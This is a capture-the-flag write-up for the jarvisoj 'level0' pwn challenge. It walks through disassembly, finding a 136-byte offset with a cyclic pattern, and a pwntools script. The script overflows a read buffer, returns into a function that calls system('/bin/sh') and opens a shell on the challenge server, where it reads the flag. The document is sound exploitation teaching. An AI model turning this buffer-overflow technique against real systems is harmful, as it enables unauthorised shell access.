# 6. jarvisoj_level0

Functions

```python
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000400418  _init
0x0000000000400450  write@plt
0x0000000000400460  system@plt
0x0000000000400470  read@plt
0x0000000000400480  __libc_start_main@plt
0x0000000000400490  __gmon_start__@plt
0x00000000004004a0  _start
0x00000000004004d0  deregister_tm_clones
0x0000000000400510  register_tm_clones
0x0000000000400550  __do_global_dtors_aux
0x0000000000400570  frame_dummy
0x0000000000400596  callsystem
0x00000000004005a6  vulnerable_function
0x00000000004005c6  main
0x0000000000400600  __libc_csu_init
0x0000000000400670  __libc_csu_fini
0x0000000000400674  _fini
```

Strings

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/6.jarvisoj_level0$ rabin2 -z level0
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000684 0x00400684 7   8    .rodata ascii /bin/sh
1   0x0000068c 0x0040068c 13  14   .rodata ascii Hello, World\n
```

Quick look at diassembly

Probably just a BOF to the callsystem

```python
pwndbg> checksec
[*] '/home/wayell/Desktop/CTF/BUUCTF/pwn/6.jarvisoj_level0/level0'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

pwndbg> disass main
Dump of assembler code for function main:
   0x00000000004005c6 <+0>:	push   rbp
   0x00000000004005c7 <+1>:	mov    rbp,rsp
   0x00000000004005ca <+4>:	sub    rsp,0x10
   0x00000000004005ce <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005d1 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004005d5 <+15>:	mov    edx,0xd
   0x00000000004005da <+20>:	mov    esi,0x40068c
   0x00000000004005df <+25>:	mov    edi,0x1
   0x00000000004005e4 <+30>:	call   0x400450 <write@plt>
   0x00000000004005e9 <+35>:	mov    eax,0x0
   0x00000000004005ee <+40>:	call   0x4005a6 <vulnerable_function>
   0x00000000004005f3 <+45>:	leave  
   0x00000000004005f4 <+46>:	ret    
End of assembler dump.
pwndbg> disass vulnerable_function 
Dump of assembler code for function vulnerable_function:
   0x00000000004005a6 <+0>:	push   rbp
   0x00000000004005a7 <+1>:	mov    rbp,rsp
   0x00000000004005aa <+4>:	add    rsp,0xffffffffffffff80
   0x00000000004005ae <+8>:	lea    rax,[rbp-0x80]
   0x00000000004005b2 <+12>:	mov    edx,0x200
   0x00000000004005b7 <+17>:	mov    rsi,rax
   0x00000000004005ba <+20>:	mov    edi,0x0
   0x00000000004005bf <+25>:	call   0x400470 <read@plt>
   0x00000000004005c4 <+30>:	leave  
   0x00000000004005c5 <+31>:	ret    
End of assembler dump.
pwndbg> disass callsystem 
Dump of assembler code for function callsystem:
   0x0000000000400596 <+0>:	push   rbp
   0x0000000000400597 <+1>:	mov    rbp,rsp
   0x000000000040059a <+4>:	mov    edi,0x400684
   0x000000000040059f <+9>:	call   0x400460 <system@plt>
   0x00000000004005a4 <+14>:	pop    rbp
   0x00000000004005a5 <+15>:	ret    
End of assembler dump.
pwndbg> q
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/6.jarvisoj_level0$ rabin2 -z level0
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000684 0x00400684 7   8    .rodata ascii /bin/sh
1   0x0000068c 0x0040068c 13  14   .rodata ascii Hello, World\n
```

Get offset

```python
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> r
Starting program: /home/wayell/Desktop/CTF/BUUCTF/pwn/6.jarvisoj_level0/level0 
Hello, World
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x00000000004005c5 in vulnerable_function ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────
 RAX  0xc9
 RBX  0x400600 (__libc_csu_init) ◂— push   r15
 RCX  0x7ffff7ec8fd2 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x200
 RDI  0x0
 RSI  0x7fffffffde60 ◂— 0x6161616261616161 ('aaaabaaa')
 R8   0x0
 R9   0x7ffff7fe0d60 (_dl_fini) ◂— endbr64 
 R10  0x40031b ◂— jb     0x400382 /* 'read' */
 R11  0x246
 R12  0x4004a0 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdff0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x6261616962616168 ('haabiaab')
 RSP  0x7fffffffdee8 ◂— 0x6261616b6261616a ('jaabkaab')
 RIP  0x4005c5 (vulnerable_function+31) ◂— ret    
──────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x4005c5 <vulnerable_function+31>    ret    <0x6261616b6261616a>

───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdee8 ◂— 0x6261616b6261616a ('jaabkaab')
01:0008│     0x7fffffffdef0 ◂— 0x6261616d6261616c ('laabmaab')
02:0010│     0x7fffffffdef8 ◂— 0x6261616f6261616e ('naaboaab')
03:0018│     0x7fffffffdf00 ◂— 0x6261617162616170 ('paabqaab')
04:0020│     0x7fffffffdf08 ◂— 0x6261617362616172 ('raabsaab')
05:0028│     0x7fffffffdf10 ◂— 0x6261617562616174 ('taabuaab')
06:0030│     0x7fffffffdf18 ◂— 0x6261617762616176 ('vaabwaab')
07:0038│     0x7fffffffdf20 ◂— 0x6261617962616178 ('xaabyaab')
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► f 0         0x4005c5 vulnerable_function+31
   f 1 0x6261616b6261616a
   f 2 0x6261616d6261616c
   f 3 0x6261616f6261616e
   f 4 0x6261617162616170
   f 5 0x6261617362616172
   f 6 0x6261617562616174
   f 7 0x6261617762616176
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/xw $rsp
0x7fffffffdee8:	0x6261616a
pwndbg> cyclic -l 0x6261616a
136
```

solver

```python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('level0')
p = remote('node4.buuoj.cn',28243)
#p = process()

# Number of padding bytes
padding = 136

# Crafting payload
payload = flat(
	asm('nop') * padding,
	elf.sym['callsystem'],
	next(elf.search(asm('ret')))
)

# Writing payload to file on same directory
f = open("payload", "wb")
f.write(payload)

p.recv()

p.sendline(payload)

p.interactive()
```

Run

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/6.jarvisoj_level0$ python3 solve.py 
[*] '/home/wayell/Desktop/CTF/BUUCTF/pwn/6.jarvisoj_level0/level0'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/wayell/Desktop/CTF/BUUCTF/pwn/6.jarvisoj_level0/level0': pid 336148
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ ls
[*] Process '/home/wayell/Desktop/CTF/BUUCTF/pwn/6.jarvisoj_level0/level0' stopped with exit code -11 (SIGSEGV) (pid 336148)
[*] Got EOF while sending in interactive
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/6.jarvisoj_level0$ python3 solve.py 
[*] '/home/wayell/Desktop/CTF/BUUCTF/pwn/6.jarvisoj_level0/level0'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to node4.buuoj.cn on port 28243: Done
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag
flag.txt
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag.txt
flag{bc9d9ea6-8434-47d5-adf8-d12dfb209d51}
```